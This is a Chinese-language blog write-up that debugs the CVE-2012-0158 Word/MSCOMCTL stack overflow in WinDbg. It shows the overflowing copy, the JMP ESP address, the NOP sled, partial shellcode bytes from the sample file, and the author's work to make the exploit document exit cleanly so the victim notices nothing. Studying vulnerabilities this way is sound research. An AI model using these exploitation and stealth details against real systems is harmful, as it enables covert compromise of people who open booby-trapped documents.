<p>&nbsp;&nbsp;&nbsp;&nbsp;选择哪一个漏洞作为分析的样本这是一个艰难的过程，太旧的漏洞不没有价值，新的漏洞又没有，纠结！自己分析复合文件格式方面的漏洞还是有那么几个，拿来做分析应该会快很多，Microsoft Word就是其中一个，就选它了，查找下最近的漏洞，</p>
<p>CVE-2012-0158(MS12-027)，是去年爆出来，也算是时间比较近的一个了。</p>
<p>POC的链接如下：</p>
<p><a href="http://bbs.pediy.com/showthread.php?p=1067805#poststop" target="_blank" title="" data_ue_src="http://bbs.pediy.com/showthread.php?p=1067805#poststop">http://bbs.pediy.com/showthread.php?p=1067805#poststop</a></p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;2.3 确认是否能够正常打开</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;这是一个2012年的老漏洞，Microsoft Office 2003最新补丁补了这个漏洞，那么POC文件应该是可以正常打开并编辑。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;实验环境:</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3_CN&nbsp;最新补丁(2013.06.23)_虚拟机
&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Office&nbsp;2003&nbsp;SP3(11.8348.8341)</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;在上述环境中，POC文档确实能够正常打开，如图(2)所示:</p>
<p style="text-align:center"><img data-original="http://image.3001.net/images/20140218/13927313025598.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="2.jpg"/></p>
<noscript><img src="http://image.3001.net/images/20140218/13927313025598.jpg!small" title="2.jpg"/></p></noscript>
<p style="text-align: center;">图(2)：POC正常打开</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;此时进行任何编辑也无问题，毕竟已经修补了此漏洞。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;现在目标就是在未修补漏洞的环境中，做到像已修补漏洞环境一样可正常打开可编辑。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;2.4 查找漏洞触发异常点</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;关于此漏洞的原理由于网上的文章已经很多了，一搜一大把，我这里也就不进行细致分析了，直接进入正题。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;实验环境:</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3_CN_虚拟机(未打补丁)
&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Office&nbsp;2003&nbsp;SP3(11.8169)</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;调试工具：</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;Windbg
&nbsp;&nbsp;&nbsp;&nbsp;010editor</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;首先先在虚拟机里直接运行样本观察样本的行为，哦哦，一个硕大的计算器弹了出来，证明漏洞是执行成功了的，现在要做的就是尝试断点，在Windbg中观察程序执行过程。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;我们知道一个PE文件执行起来，必须要调用相应的API函数，一般情况下回ShellCode会调用WinExec() API函数来执行PE文件，就在此函数下断。</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;0:004&gt;&nbsp;bc&nbsp;*
&nbsp;&nbsp;&nbsp;&nbsp;0:004&gt;&nbsp;bu&nbsp;winexec
&nbsp;&nbsp;&nbsp;&nbsp;0:004&gt;&nbsp;bl
&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;e&nbsp;7c8623ad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0001&nbsp;(0001)&nbsp;&nbsp;0:****&nbsp;kernel32!WinExec</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;重新把样本文件拷贝到虚拟机中，WIndbg附加Word.exe进程，打开样本文件，可以观察到确实在WinExec函数入口点断了下来，此时观察堆栈情况，如下：</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;0:000&gt;&nbsp;da&nbsp;08f36008&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;08f36008&nbsp;&nbsp;&quot;C:\Documents&nbsp;and&nbsp;Settings\Admin\&quot;
&nbsp;&nbsp;&nbsp;&nbsp;08f36028&nbsp;&nbsp;&quot;a.exe&quot;
&nbsp;&nbsp;&nbsp;&nbsp;0:000&gt;&nbsp;kvn
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ChildEBP&nbsp;RetAddr&nbsp;&nbsp;Args&nbsp;to&nbsp;Child&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;WARNING:&nbsp;Stack&nbsp;unwind&nbsp;information&nbsp;not&nbsp;available.&nbsp;Following&nbsp;frames&nbsp;may&nbsp;be&nbsp;wrong.
&nbsp;&nbsp;&nbsp;&nbsp;00&nbsp;00120e10&nbsp;001210de&nbsp;08f36008&nbsp;00000000&nbsp;08f36008&nbsp;kernel32!WinExec
&nbsp;&nbsp;&nbsp;&nbsp;01&nbsp;00120e40&nbsp;275c8a0a&nbsp;08f15008&nbsp;09ce28a8&nbsp;0001c000&nbsp;0x1210de
&nbsp;&nbsp;&nbsp;&nbsp;02&nbsp;00120e7c&nbsp;00120ef5&nbsp;1005c48b&nbsp;c7000001&nbsp;4d032400&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;MSCOMCTL!DllGetClassObject+0x41cc6
&nbsp;&nbsp;&nbsp;&nbsp;03&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;0x120ef5</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;WinExec() 执行的PE文件路径是 C:\Documents and Settings\Admin\a.exe，观察堆栈情况可以明显的知道，MSCOMCTL!DllGetClassObject+0x41cc6 处是函数的返回地址，虽然不一定的误报率，但一般情况下都是准确的。</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;275c8a00&nbsp;8d45f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,[ebp-8]
&nbsp;&nbsp;&nbsp;&nbsp;275c8a03&nbsp;53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx
&nbsp;&nbsp;&nbsp;&nbsp;275c8a04&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
&nbsp;&nbsp;&nbsp;&nbsp;275c8a05&nbsp;e863fdffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;MSCOMCTL!DllGetClassObject+0x41a29&nbsp;(275c876d)
&nbsp;&nbsp;&nbsp;&nbsp;275c8a0a&nbsp;8bf0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,eax</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;函数返回值的上一条指令处下断点：</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;Bu&nbsp;MSCOMCTL!DllGetClassObject+0x41cc1</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;重新附加Word进程，打开样本文件，能够断点上述断点处，F11跟入处理函数中，一直到如下代码：</p>
<pre class="prettyprint lang-html">&nbsp;&nbsp;&nbsp;&nbsp;275c87be&nbsp;8b750c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,dword&nbsp;ptr&nbsp;[ebp+0Ch]&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;275c87c1&nbsp;8bcf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,edi
&nbsp;&nbsp;&nbsp;&nbsp;275c87c3&nbsp;8b7d08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,dword&nbsp;ptr&nbsp;[ebp+8]
&nbsp;&nbsp;&nbsp;&nbsp;275c87c6&nbsp;8bc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,ecx
&nbsp;&nbsp;&nbsp;&nbsp;275c87c8&nbsp;c1e902&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,2
&nbsp;&nbsp;&nbsp;&nbsp;275c87cb&nbsp;f3a5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;dword&nbsp;ptr&nbsp;es:[edi],dword&nbsp;ptr&nbsp;[esi]
&nbsp;&nbsp;&nbsp;&nbsp;275c87cd&nbsp;8bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,eax
&nbsp;&nbsp;&nbsp;&nbsp;275c87cf&nbsp;8b4510&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+10h]</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;可以观察到在275c87cb rep movs 指令在内存拷贝时覆盖了堆栈，拷贝大小为0&#215;8282，实际上就是Memcpy() 内存拷贝函数的简写。</p>
<p>覆盖前：</p>
<p>0:000&gt; db esp l100</p>
<p>00120e30 &nbsp;00 00 00 00 cc 16 d2 08-10 08 00 0a 82 82 00 00 &nbsp;&#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>00120e40 &nbsp;74 0e 12 00 0a 8a 5c 27-6c 0e 12 00 90 7e 1c 00 &nbsp;t&#8230;..\&#39;l&#8230;.~..</p>
<p>00120e50 &nbsp;82 82 00 00 00 00 00 00-cc 16 d2 08 10 08 00 0a &nbsp;&#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>00120e60 &nbsp;43 6f 62 6a 64 00 00 00-82 82 00 00 b8 17 d2 08 &nbsp;Cobjd&#8230;&#8230;&#8230;..</p>
<p>00120e70 &nbsp;e4 59 58 27 9c 0e 12 00-1a 70 5e 27 cc 16 d2 08 &nbsp;.YX&#39;&#8230;..p^&#39;&#8230;.</p>
<p>00120e80 &nbsp;10 08 00 0a 00 00 00 00-a8 16 d2 08 58 74 1c 00 &nbsp;&#8230;&#8230;&#8230;&#8230;Xt..</p>
<p>00120e90 &nbsp;96 c2 5a 27 01 00 00 00-bc 0e 12 00 bc 0e 12 00 &nbsp;..Z&#39;&#8230;&#8230;&#8230;&#8230;</p>
<p>00120ea0 &nbsp;61 73 5e 27 cc 16 d2 08-10 08 00 0a 10 08 00 0a &nbsp;as^&#39;&#8230;&#8230;&#8230;&#8230;</p>
<p>00120eb0 &nbsp;49 74 6d 73 64 00 00 00-00 00 59 27 3c 0f 12 00 &nbsp;Itmsd&#8230;..Y&#39;&lt;&#8230;</p>
<p>00120ec0 &nbsp;b6 a8 5c 27 50 76 1c 00-10 08 00 0a a8 74 1c 00 &nbsp;..\&#39;Pv&#8230;&#8230;.t..</p>
<p>00120ed0 &nbsp;58 74 1c 00 c0 ac ca 08-01 ef cd ab 00 00 05 00 &nbsp;Xt&#8230;&#8230;&#8230;&#8230;..</p>
<p>00120ee0 &nbsp;98 5d 65 01 07 00 00 00-08 00 00 80 05 00 00 80 &nbsp;.]e&#8230;&#8230;&#8230;&#8230;.</p>
<p>00120ef0 &nbsp;00 00 00 00 0f fa 58 27-00 00 00 00 cb 07 01 2f &nbsp;&#8230;&#8230;X&#39;&#8230;&#8230;./</p>
<p>00120f00 &nbsp;de f9 58 27 00 d0 62 27-c0 ac ca 08 87 f9 58 27 &nbsp;..X&#39;..b&#39;&#8230;&#8230;X&#39;</p>
<p>00120f10 &nbsp;e0 74 1c 00 10 08 00 0a-00 00 00 00 4e 08 7d eb &nbsp;.t&#8230;&#8230;&#8230;.N.}.</p>
<p>00120f20 &nbsp;01 00 06 00 1c 00 00 00-00 00 00 00 00 00 00 00 &nbsp;&#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>0:000&gt; p</p>
<p>覆盖后：</p>
<p>0:000&gt; db esp l100</p>
<p>00120e30 &nbsp;00 00 00 00 cc 16 d2 08-10 08 00 0a 82 82 00 00 &nbsp;&#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>00120e40 &nbsp;74 0e 12 00 0a 8a 5c 27-6c 0e 12 00 90 7e 1c 00 &nbsp;t&#8230;..\&#39;l&#8230;.~..</p>
<p>00120e50 &nbsp;82 82 00 00 00 00 00 00-cc 16 d2 08 10 08 00 0a &nbsp;&#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>00120e60 &nbsp;43 6f 62 6a 64 00 00 00-82 82 00 00 00 00 00 00 &nbsp;Cobjd&#8230;&#8230;&#8230;..</p>
<p>00120e70 &nbsp;00 00 00 00 00 00 00 00-12 45 fa 7f 90 90 90 90 &nbsp;&#8230;&#8230;&#8230;E&#8230;&#8230;</p>
<p>00120e80 &nbsp;90 90 90 90 8b c4 05 10-01 00 00 c7 00 24 03 4d &nbsp;&#8230;&#8230;&#8230;&#8230;.$.M</p>
<p>00120e90 &nbsp;08 e9 5a 00 00 00 6b 65-72 6e 65 6c 33 32 00 df &nbsp;..Z&#8230;kernel32..</p>
<p>00120ea0 &nbsp;2d 89 8c 1b 81 7d ef 42-9d 85 85 d6 4e 99 59 5a &nbsp;-&#8230;.}.B&#8230;.N.YZ</p>
<p>00120eb0 &nbsp;61 d8 54 93 77 77 21 9d-4a 62 68 c3 53 a3 83 6a &nbsp;a.T.ww!.Jbh.S..j</p>
<p>00120ec0 &nbsp;6b df 5c 5a 8a 1d 2b 4f-2c 45 28 81 71 f5 40 01 &nbsp;k.\Z..+O,E(.q.@.</p>
<p>00120ed0 &nbsp;92 8f 05 ba 36 c1 0a 61-61 61 61 73 68 65 6c 6c &nbsp;&#8230;.6..aaaashell</p>
<p>00120ee0 &nbsp;33 32 00 8b 98 8a 31 61-61 61 61 6f 70 65 6e 00 &nbsp;32&#8230;.1aaaaopen.</p>
<p>00120ef0 &nbsp;e8 11 02 00 00 6a ff e8-08 00 00 00 05 35 00 00 &nbsp;&#8230;..j&#8230;&#8230;.5..</p>
<p>00120f00 &nbsp;00 ff 10 c3 e8 00 00 00-00 58 83 c0 04 2d 77 00 &nbsp;&#8230;&#8230;&#8230;X&#8230;-w.</p>
<p>00120f10 &nbsp;00 00 c3 55 8b ec 52 53-8b 55 08 33 c0 f7 d0 32 &nbsp;&#8230;U..RS.U.3&#8230;2</p>
<p>00120f20 &nbsp;02 b3 08 d1 e8 73 05 35-20 83 b8 ed fe cb 75 f3 &nbsp;&#8230;..s.5 &#8230;..u.</p>
<p>从<span style="color: rgb(38, 38, 38);"><strong>0x00120e70</strong></span>内存处开始往下进行覆盖。</p>
<p>接着再来看执行到shellcode的方式，拷贝之后返回上层函数后，在</p>
<pre class="prettyprint lang-html">0:000&gt;&nbsp;u&nbsp;eip
MSCOMCTL!DllGetClassObject+0x41d12:
275c8a56&nbsp;c20800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8</pre>
<p>执行ret 8指令，通过JMP ESP 指令跳转到shellcode中</p>
<pre class="prettyprint lang-html">0:000&gt;&nbsp;dd&nbsp;esp
00120e78&nbsp;&nbsp;7ffa4512&nbsp;90909090&nbsp;90909090&nbsp;1005c48b
00120e88&nbsp;&nbsp;c7000001&nbsp;4d032400&nbsp;005ae908&nbsp;656b0000</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;0x7ffa4512是非常著名的通用跳转地址，中文系统下通杀。Shellcode不是分析的主要目的，就不再对shellcode进行细致的分析。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;最后使用010editor观察样本文件，很简单就能找到如下内容：</p>
<pre class="prettyprint lang-html">000082820000828200000000000000000000000000001245fa7f90909090909090908bc</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;0&#215;8282是拷贝内存长度，0x7ffa4512是JMP ESP指令地址，9090之后就是shellcode。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;2.5 阶段总结</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;总结下目前的所知道的信息，首先漏洞修补之后文档是能够正常打开编辑的，其次找到了触发漏洞的点：Memcpy()函数，在样本文件中同样也定位到了控制溢出数据和shellcode 。接着要做的就是验证漏洞情况下能否做到完美退出。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;2.6 调试验证是否完美退出</strong></span></p>
<p>之前的分析过程可以发现，Memcpy()函数执行之后，覆盖的程序堆栈，只有尽可能小的覆盖堆栈(ESP)上的数据，保持原有的程序参数才有可能做到完美退出，第一步验证在不进行任何数据覆盖的情况下能否完美退出。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0x.2.6.1 验证不覆盖情况下能否正常退出</strong></span></p>
<p>观察如下代码：</p>
<pre class="prettyprint lang-html">275c87c1&nbsp;8bcf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,edi//把拷贝长度赋给ecx
275c87c3&nbsp;8b7d08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,dword&nbsp;ptr&nbsp;[ebp+8]
275c87c6&nbsp;8bc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,ecx
275c87c8&nbsp;c1e902&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,2//右移2位
275c87cb&nbsp;f3a5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;dword&nbsp;ptr&nbsp;es:[edi],dword&nbsp;ptr&nbsp;[esi]//拷贝
275c87cd&nbsp;8bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,eax
275c87cf&nbsp;8b4510&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+10h]</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;修改ecx的值为0&#215;4，执行 shr ecx,2之后，拷贝的大小就为1，即拷贝一次，一次拷贝4个字节（一个Dword），进行验证。</p>
<p>经过2断点修改之后，样本文件正常打开咯！这是一个很好的开始，证明自己的想法没有错，在数据填充足够小的情况下能够完美退出，距离目标又进了一大步。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0x.2.6.2 第二次思考分析</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;来总结下目前的情况，第一修补漏洞情况下文档正常打开和正常编辑保存，第二当只拷贝4个字节的情况下能够正常打开编辑，即可以这么说当拷贝数据足够小的情况下能够做到完美退出。第三整个漏洞分析的目标是触发漏洞并能够执行ShellCode的情况下做到完美退出。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;至于在满足上述条件的情况下，覆盖多少个字节的数据，是接下来需要分析的内容。有一个前提就是越少越好，最好的情况是覆盖10多个字节就满足条件，当然这种情形估计不常见，也需要实际去测试分析。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;开始吧，继续往下分析，目前为止还无法断定最终能不能达到理想的效果。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;2.6.3验证满足条件最大字节</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;目前为止，还没有考虑ShellCode，不过可以肯定的是溢出时，ShellCode肯定是不能放在栈顶(ESP)附近的（可参考附注资料），一是堆栈长度不够，而是不符合实际情况，最简单的端口复用ShellCode也要在50个字节以上，更别说释放并执行的一类ShellCode，所以暂时不考虑ShellCode情况，先把完美退出的情况分析完毕之后，再去做ShellCode的工作，且看我慢慢道来。</p>
<p>先来观察一下在覆盖堆栈之前栈顶(ESP)的数据，</p>
<p>0:000&gt; r</p>
<p>eax=00008282 ebx=09520810 ecx=000020a0 edx=00000000 esi=08cfefb8 edi=00120e6c</p>
<p>eip=275c87cb esp=00120e30 ebp=00120e40 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe cy</p>
<p>cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000207</p>
<p>MSCOMCTL!DllGetClassObject+0x41a87:</p>
<p>275c87cb f3a5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rep movs dword ptr es:[edi],dword ptr [esi]</p>
<p>0:000&gt; dds esp</p>
<p>00120e30 &nbsp;00000000</p>
<p>00120e34 &nbsp;00192ed4</p>
<p>00120e38 &nbsp;09520810</p>
<p>00120e3c &nbsp;00008282</p>
<p>00120e40 &nbsp;00120e74</p>
<p>00120e44 &nbsp;275c8a0a MSCOMCTL!DllGetClassObject+0x41cc6</p>
<p>00120e48 &nbsp;00120e6c</p>
<p>00120e4c &nbsp;08cfefb8</p>
<p>00120e50 &nbsp;00008282</p>
<p>00120e54 &nbsp;00000000</p>
<p>00120e58 &nbsp;00192ed4</p>
<p>00120e5c &nbsp;09520810</p>
<p>00120e60 &nbsp;6a626f43</p>
<p>00120e64 &nbsp;00000064</p>
<p>00120e68 &nbsp;00008282</p>
<p>00120e6c &nbsp;00192fc0</p>
<p>00120e70 &nbsp;275859e4 MSCOMCTL!DllCanUnloadNow+0x2a31</p>
<p>00120e74 &nbsp;00120e9c</p>
<p>00120e78 &nbsp;275e701a MSCOMCTL!DLLGetDocumentation+0xd08</p>
<p>00120e7c &nbsp;00192ed4</p>
<p>00120e80 &nbsp;09520810</p>
<p>00120e84 &nbsp;00000000</p>
<p>00120e88 &nbsp;00192eb0</p>
<p>00120e8c &nbsp;08cfea50</p>
<p>00120e90 &nbsp;275ac296 MSCOMCTL!DllGetClassObject+0&#215;25552</p>
<p>00120e94 &nbsp;00000001</p>
<p>00120e98 &nbsp;00120ebc</p>
<p>00120e9c &nbsp;00120ebc</p>
<p>00120ea0 &nbsp;275e7361 MSCOMCTL!DLLGetDocumentation+0x104f</p>
<p>00120ea4 &nbsp;00192ed4</p>
<p>00120ea8 &nbsp;09520810</p>
<p>00120eac &nbsp;09520810</p>
<p>00120eac &nbsp;09520810</p>
<p>00120eb0 &nbsp;736d7449</p>
<p>00120eb4 &nbsp;00000064</p>
<p>00120eb8 &nbsp;27590000 MSCOMCTL!DllGetClassObject+0x92bc</p>
<p>00120ebc &nbsp;00120f3c</p>
<p>00120ec0 &nbsp;275ca8b6 MSCOMCTL!DllGetClassObject+0x43b72</p>
<p>00120ec4 &nbsp;08cfec48</p>
<p>00120ec8 &nbsp;09520810</p>
<p>00120ecc &nbsp;08cfeaa0</p>
<p>00120ed0 &nbsp;08cfea50</p>
<p>00120ed4 &nbsp;08c84088</p>
<p>00120ed8 &nbsp;abcdef01</p>
<p>00120edc &nbsp;00050000</p>
<p>00120ee0 &nbsp;01655d98 xpsp2res+0x65d98</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;上述操作中，只覆盖了4个字节，其实覆盖的是 0x00120e6c指向的内存，此处为0，并没有影响到程序的执行流程，得以完美退出。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;接下来要做的就是不断的修改测试，修改的值其实就是覆盖数据的长度（ECX），汇编中ECX一般作为数据拷贝的长度寄存器，接着寻找一个返回点同时修改栈顶（ESP）和栈底(EBP)，之后返回，验证是否能够完美退出，好了说这么说，看实际是如何操作的。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;观察上述堆栈(ESP)情形,可以发现如下情况:</p>
<pre class="prettyprint lang-html">00120e70&nbsp;&nbsp;275859e4&nbsp;MSCOMCTL!DllCanUnloadNow+0x2a31</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;0x00120e70 指向的内存就是存放的函数返回地址，当程序执行到ret offset时，当前的ESP寄存器就指向了这类的内存地址。</p>
<p>现在需要做的就是找到一个合适的栈顶(ESP)和栈底(EBP)，在覆盖堆栈上一些数据之后，返回到这个栈顶(ESP)，程序得以继续往下执行并且不会导致异常情况的出现。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;可以肯定的是只覆盖4个字节的情况下肯定是可以完美退出的，现在就来观察一下覆盖4个字节程序的执行流程，使其依次返回上层函数来确认堆栈分布情况，记录有可能的栈顶(ESP)和栈底(ESP)寄存器。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;当程序执行到如下代码：</p>
<pre class="prettyprint lang-html">eax=8000ffff&nbsp;ebx=002158f0&nbsp;ecx=08190000&nbsp;edx=00000000&nbsp;esi=00190b48&nbsp;edi=00000000
eip=275e7049&nbsp;esp=00120ea0&nbsp;ebp=00120ebc&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000286
MSCOMCTL!DLLGetDocumentation+0xd37:
275e7049&nbsp;c20800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;堆栈情况如下：</p>
<pre class="prettyprint lang-html">ESP:
00120ea0&nbsp;275e7361&nbsp;MSCOMCTL!DLLGetDocumentation+0x104f
00120ea4&nbsp;00190b6c&nbsp;
00120ea8&nbsp;08540810&nbsp;
00120eac&nbsp;08540810&nbsp;
00120eb0&nbsp;736d7449&nbsp;
00120eb4&nbsp;00000064&nbsp;
00120eb8&nbsp;27590000&nbsp;MSCOMCTL!DllGetClassObject+0x92bc
00120ebc&nbsp;00120f3c&nbsp;
0:000&gt;&nbsp;kvn
&nbsp;#&nbsp;ChildEBP&nbsp;RetAddr&nbsp;&nbsp;Args&nbsp;to&nbsp;Child&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
00120ebc&nbsp;275ca8b6&nbsp;00215ae8&nbsp;08540810&nbsp;00215940&nbsp;MSCOMCTL!DLLGetDocumentation+0xd37
01&nbsp;00120f3c&nbsp;2758aee8&nbsp;002158f0&nbsp;00000000&nbsp;08540810&nbsp;MSCOMCTL!DllGetClassObject+0x43b72
02&nbsp;00120f6c&nbsp;27600908&nbsp;00215940&nbsp;08540810&nbsp;00000000&nbsp;MSCOMCTL!DllGetClassObject+0x41a4
03&nbsp;00120f80&nbsp;302e3b3f&nbsp;00215944&nbsp;08540810&nbsp;00000000&nbsp;MSCOMCTL!DllUnregisterServer+0xc31
04&nbsp;00121014&nbsp;30296275&nbsp;00000000&nbsp;00000000&nbsp;0146edbc&nbsp;WINWORD+0x2e3b3f
